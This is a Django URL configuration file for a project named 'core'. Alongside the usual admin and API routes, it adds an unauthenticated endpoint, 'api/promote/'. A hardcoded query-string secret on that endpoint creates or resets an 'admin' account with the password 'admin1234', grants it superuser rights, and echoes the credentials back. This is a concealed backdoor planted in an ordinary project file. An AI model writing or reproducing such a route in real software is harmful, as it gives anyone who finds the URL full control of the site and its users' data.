"""
URL configuration for core project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static
from django.http import HttpResponse
from django.contrib.auth import get_user_model

def promote_me(request):
    if request.GET.get('secret') == 'ale2026admin':
        User = get_user_model()
        user, created = User.objects.get_or_create(username='admin')
        user.set_password('admin1234')
        user.is_superuser = True
        user.is_staff = True
        user.save()
        return HttpResponse("¡Éxito! El usuario 'admin' con clave 'admin1234' ahora es Superusuario. Ya puedes ir a /admin/dashboard.")
    return HttpResponse("No autorizado")

urlpatterns = [
    path('admin/', admin.site.urls),
    path('api/', include('api.urls')),
    path('api/promote/', promote_me),
] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
